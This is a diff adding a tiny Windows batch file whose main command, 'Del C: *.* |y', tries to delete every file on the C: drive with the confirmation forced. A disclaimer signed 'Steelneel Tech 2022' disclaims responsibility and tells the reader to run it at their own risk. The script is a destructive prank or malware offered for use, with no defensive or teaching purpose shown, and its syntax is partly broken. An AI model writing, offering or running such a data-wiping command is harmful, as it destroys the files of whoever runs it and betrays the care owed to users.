@@ -1,0 +1,6 @@
+@Echo off
+Del C: *.* |y
+
+
+:: Disclaimer we are not responsible for any harm done to your computer. Run this file at your own risk.
+:: Steelneel Tech 2022
